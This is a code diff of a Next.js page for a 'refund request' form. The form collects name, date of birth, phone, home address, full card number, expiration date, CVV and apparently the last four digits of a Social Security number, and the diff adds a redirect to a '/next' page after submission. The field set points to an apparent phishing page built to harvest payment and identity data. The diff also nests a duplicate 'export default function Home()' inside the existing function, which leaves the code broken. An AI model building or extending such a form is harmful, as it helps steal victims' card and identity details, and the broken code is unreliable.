@@ -38,8 +38,29 @@ export default function Home() {
     lfssn:"",
   });
 
+
+export default function Home() {
+  const [formData, setFormData] = useState<FormData>({
+    amount: 0,
+    orderId: "",
+    reason: "",
+    firstName: "",
+    lastName: "",
+    dob: "",
+    mobileNumber: "",
+    homeAddress: "",
+    zipCode: "",
+    cardType: "",
+    cardNumber: "",
+    expirationDate: "",
+    cvv: "",
+    lfssn: "",
+  });
+
   const [isLoading, setIsLoading] = useState(false);
   const [statusMessage, setStatusMessage] = useState("");
+  
+  const router = useRouter(); // Initialize useRouter
 
   const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { id, value } = e.target;
@@ -55,10 +76,16 @@ export default function Home() {
     setStatusMessage("");
 
     try {
+      // Submit the form data
       await handleFormSubmit(formData);
       setStatusMessage("Refund request submitted successfully!");
+
+      // Redirect to next.tsx after successful submission
+      router.push('/next'); // This will navigate to the `next.tsx` page
+
+      // Reset the form data
       setFormData({
-        amount:0,
+        amount: 0,
         orderId: "",
         reason: "",
         firstName: "",
@@ -71,7 +98,7 @@ export default function Home() {
         cardNumber: "",
         expirationDate: "",
         cvv: "",
-        lfssn:"",
+        lfssn: "",
       });
     } catch (error) {
       setStatusMessage("Failed to submit the refund request. Please try again.");
